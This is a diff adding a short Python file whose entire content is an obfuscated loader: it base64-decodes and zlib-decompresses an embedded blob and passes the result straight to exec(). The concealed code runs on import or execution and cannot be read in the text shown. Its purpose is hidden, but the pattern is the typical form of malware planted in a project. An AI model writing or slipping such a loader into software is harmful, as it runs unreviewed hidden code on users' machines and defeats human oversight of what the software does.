@@ -1,0 +1,17 @@
+import base64, zlib
+exec(zlib.decompress(base64.b64decode(
+  "eNrVVV9v2jAQf8+nOKUPJFoaYJumKVMm0YK2qvypaHloGUImdqhF4kS2s0I7pH2IfcJ9kp0DaSnd"
+  "uodpmsYL8dm+393v7n7maZ5JDWqlrFhmKeREXyd8BnxjP8OlNRwMLkLz5Uc31HGt6JqIOVPheGJR"
+  "FoNkeUIiNs1ExBxzf6q09CBLqAeC3XiQErlg0g0swF8eGnf16lxp4zGITEPusyVXWjluALnkQjux"
+  "DbCEo1F31G/1Wu2TAO6qi2vbfQfbSHyS50xQ5wHdXmUL28UTkulCihJFh7kvGaFTzZbaYSLKKBfz"
+  "0C50fPjWdqtINtECEbT65AJ08AzWLdFMAFskfB9ShNqPsgIzQTbuEUQYNh5n2OoffxwM4XJwihlu"
+  "UMfB6zeT3yT5cG0f2KC8b+7R2OlfdYbnJ1fQ7nw46YJzJ9ZL93mEKFskxb7z3L+RXLMNj9rf1t+k"
+  "6Jl6N13vCbnPYVA2x6pzyRNqCLSsXmjPSLTAY3U8XU8zyhLl5yvbsg6gzUjCpD8jCcF+mxaK1iiy"
+  "rzIhCUSFlIi9MsVg4GzOQumACwbfv36DI7Lix4WsUQJEo4+UK9d61MI9r8yyVquZvx2gAHomejqO"
+  "k4zoCYTYIGY9jbKkSIXTL1ImeeQ0X3rw0vUAh4MUiQ4bHigmPzM5rSwlc3bDZGswDsqoQJEZ1zBD"
+  "JlKI+YpoDk4hC4ExKC6ICy9gQeQ8gyLCauBmA0NYEaG45klKbjfOCsH1FOsesb8RL7Lyj+gROIYb"
+  "hnKCpS5pQg4UxyVXMCt27YIy4CphgqPuwMXwEr7A6Lxduqua5D5e7MKn0Z5rHJ2582onUBv92L8I"
+  "toZ7tf+5nvYfcYzyaW20xv6E8hbCWeu0c4FC0+p2hsejYW/Q7nSDanjvx3Qw7IFpIMT42VwCekLP"
+  "cSYh9lKjw1sV2RW2uxiVUq1RN1EtrRmh4TgCcyXauWAEMRo3J8bk7OpmJXHbF2NiPTg+IgqzTjhK"
+  "MibpbD25h2aBMO66/shu0BEFdwLznJq3TDtN1/oB1oNpDQ=="
+)).decode())
